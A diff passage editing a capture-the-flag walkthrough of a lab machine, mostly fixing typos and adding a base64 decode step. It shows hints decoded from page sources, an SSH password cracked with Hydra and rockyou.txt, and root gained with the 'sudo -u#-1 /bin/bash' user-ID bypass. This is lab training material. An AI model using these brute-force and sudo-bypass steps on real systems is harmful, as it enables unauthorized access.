@@ -158,11 +158,11 @@ c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
 
 Decoded Base64 blob:
 ```
+$ echo "c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==" | base64 -d
 ssh-bruteforce-sudoit
 ```
 
-At `http://192.168.1.146/ftc.html` page source we found a obfuscated message.\
-This is a simple ASCII code.
+At `http://192.168.1.146/ftc.html` page source we found a obfuscated message.
 ```
 <!--
 #117
@@ -183,7 +183,7 @@ This is a simple ASCII code.
 -->
 </html>
 ```
-
+This is a simple ASCII code.\
 I made a C code to convert it:
 ```
 $ cat ascii2char.c
@@ -201,7 +201,7 @@ $ gcc ascii2char.c -o ascii2char.o && ./ascii2char.o
 use rockyou.txt
 ```
 
-At page source of `` we can find the username
+At page source code of `http://192.168.1.146/sudo.html` we can find the username
 ```
 <html>
 <body style="background-color:#000000">
@@ -243,7 +243,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-08 13:46:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-08 13:59:05
 ```
 
-User: **test**
+User: **test** \
 Pass: **jordan23**
 
 ### SSH Connection
@@ -263,7 +263,7 @@ uid=1001(test) gid=1001(test) groups=1001(test)
 
 ### Privilege Escalation
 
-Looking into `.bash_history` file we found many occourences for an file called `pass.txt`.\
+Looking into `.bash_history` file we found many occurrences for an file called `pass.txt`.\
 So I try to find it.
 ```
 test@ctf:/$ find . | grep pass.txt
@@ -279,7 +279,7 @@ $ echo "Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo=" | base64 -d
 CTFdfrGHYjUsSsKK@12345
 ```
 
-Still in `.bash_history` file we can find occourences of `sudo -u#-1 /bin/bash` command.
+Still in `.bash_history` file we can find occurrences of `sudo -u#-1 /bin/bash` command.
 ```
 test@ctf:~$ sudo -u#-1 /bin/bash
 
